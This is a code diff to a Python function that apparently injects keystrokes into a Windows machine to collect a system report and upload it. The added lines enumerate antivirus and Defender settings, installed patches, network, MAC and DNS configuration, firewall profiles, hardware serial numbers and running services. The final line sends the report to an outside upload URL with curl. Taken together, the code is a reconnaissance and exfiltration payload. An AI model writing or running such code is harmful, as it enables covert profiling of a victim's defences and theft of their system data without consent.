@@ -105,20 +105,83 @@ def import_data_on_website(kbd, layout):
     run_cmd("type nul > " + REPORT_PATH)
     run_cmd("(echo [SYSTEME]) >> " + REPORT_PATH)
     run_cmd(
-        'systeminfo | findstr /C:"Nom de l" /C:"OS Name" /C:"OS Version" /C:"BIOS Version" /C:"Domain" >> '
+        'systeminfo | findstr /C:"Nom de l" /C:"OS Name" /C:"OS Version" /C:"BIOS Version" /C:"Domain" /C:"Mémoire physique totale" >> '
         + REPORT_PATH,
         wait=6.0,
     )
     run_cmd("(echo.) >> " + REPORT_PATH)
+    run_cmd("(echo [ANTIVIRUS]) >> " + REPORT_PATH)
+    run_cmd('(powershell -NoProfile -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct") >> ' + REPORT_PATH, wait=1.0,)
+    run_cmd('(powershell -NoProfile -Command "Get-MpComputerStatus") >> ' + REPORT_PATH, wait=1.0,)
+    run_cmd('(powershell -NoProfile -Command "Get-MpPreference") >> ' + REPORT_PATH, wait=1.0,)
+    
+    run_cmd("(echo.) >> " + REPORT_PATH)
+    run_cmd("(echo [MAJ]) >> " + REPORT_PATH)
+    run_cmd('(powershell -NoProfile -Command "Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 20") >> ' + REPORT_PATH, wait=1.0,)
+    
+    run_cmd("(echo.) >> " + REPORT_PATH)
     run_cmd("(echo [UTILISATEURS LOCAUX]) >> " + REPORT_PATH)
     run_cmd("net user >> " + REPORT_PATH)
-    run_cmd("(echo.) >> " + REPORT_PATH)
-    run_cmd("(echo [CONNEXIONS RESEAU ACTIVES]) >> " + REPORT_PATH)
-    run_cmd("netstat -an | findstr ESTABLISHED >> " + REPORT_PATH, wait=2.0)
-    run_cmd("(echo.) >> " + REPORT_PATH)
-    run_cmd("(echo [PROFILS WIFI ENREGISTRES]) >> " + REPORT_PATH)
-    run_cmd("netsh wlan show profiles >> " + REPORT_PATH, wait=2.0)
 
+
+
+    run_cmd("(echo.) >> " + REPORT_PATH)
+    run_cmd("(echo [CONFIGURATION RESEAU]) >> " + REPORT_PATH)
+    run_cmd("ipconfig >> " + REPORT_PATH, wait=1.0)
+
+    run_cmd("(echo.) >> " + REPORT_PATH)
+    run_cmd("(echo [IP]) >> " + REPORT_PATH)
+    run_cmd('(powershell -NoProfile -Command "Get-NetIPConfiguration") >> ' + REPORT_PATH, wait=2.0,)
+
+    run_cmd("(echo.) >> " + REPORT_PATH)
+    run_cmd("(echo [MAC]) >> " + REPORT_PATH)
+    run_cmd('(getmac /v) >> ' + REPORT_PATH, wait=1.0,)
+
+    run_cmd("(echo.) >> " + REPORT_PATH)
+    run_cmd("(echo [DNS]) >> " + REPORT_PATH)
+    run_cmd('(powershell -NoProfile -Command "Get-DnsClientServerAddress") >> ' + REPORT_PATH, wait=2.0,)
+
+    run_cmd("(echo.) >> " + REPORT_PATH)
+    run_cmd("(echo [FIREWALL]) >> " + REPORT_PATH)
+    run_cmd('(powershell -NoProfile -Command "Get-NetFirewallProfile") >> ' + REPORT_PATH, wait=2.0,)
+    
+
+    run_cmd("(echo.) >> " + REPORT_PATH)
+    run_cmd("(echo [PARTITION ET VOLUMES]) >> " + REPORT_PATH)
+    run_cmd("chcp 65001>nul&wmic logicaldisk get name,description,filesystem,size,freespace | more >> " + REPORT_PATH, wait=2.0)
+
+    run_cmd("chcp 65001>nul&(echo.) >> " + REPORT_PATH)
+    run_cmd("(echo [BIOS UEFI]) >> " + REPORT_PATH)
+    run_cmd("chcp 65001>nul&wmic bios get manufacturer,name,version,serialnumber,releasedate | more >> " + REPORT_PATH, wait=2.0)
+
+    run_cmd("chcp 65001>nul&(echo.) >> " + REPORT_PATH)
+    run_cmd("(echo [CARTE MERE]) >> " + REPORT_PATH)
+    run_cmd("chcp 65001>nul&wmic baseboard get product,manufacturer,version,serialnumber | more >> " + REPORT_PATH, wait=2.0)
+
+    run_cmd("chcp 65001>nul&(echo.) >> " + REPORT_PATH)
+    run_cmd("(echo [RAM]) >> " + REPORT_PATH)
+    run_cmd("chcp 65001>nul&wmic memorychip get capacity,speed,manufacturer,partnumber | more >> " + REPORT_PATH, wait=2.0)
+    run_cmd(
+        'chcp 65001>nul&(powershell -NoProfile -Command "[Math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)" >> '
+        + REPORT_PATH,
+        wait=2.0,
+    )
+
+    run_cmd("chcp 65001>nul&(echo.) >> " + REPORT_PATH)
+    run_cmd("(echo [CPU]) >> " + REPORT_PATH)
+    run_cmd("chcp 65001>nul&wmic cpu get name,numberofcores,numberoflogicalprocessors,maxclockspeed | more >> " + REPORT_PATH, wait=2.0)
+
+    run_cmd("chcp 65001>nul&(echo.) >> " + REPORT_PATH)
+    run_cmd("(echo [GPU]) >> " + REPORT_PATH)
+    run_cmd("chcp 65001>nul&wmic path win32_VideoController get name,adapterram,driverversion | more >> " + REPORT_PATH, wait=2.0)
+
+    run_cmd("chcp 65001>nul&(echo.) >> " + REPORT_PATH)
+    run_cmd("(echo [STOCKAGE]) >> " + REPORT_PATH)
+    run_cmd("chcp 65001>nul&wmic diskdrive get model,size,serialnumber,mediatype | more >> " + REPORT_PATH, wait=2.0)
+
+    run_cmd("chcp 65001>nul&(echo.) >> " + REPORT_PATH)
+    run_cmd("(echo [TASK]) >> " + REPORT_PATH)
+    run_cmd("(tasklist /svc) >> " + REPORT_PATH, wait=2.0)
 
     run_cmd('curl -F "file=@' + REPORT_PATH + '" ' + WEB_UPLOAD_URL, wait=3.0)
 
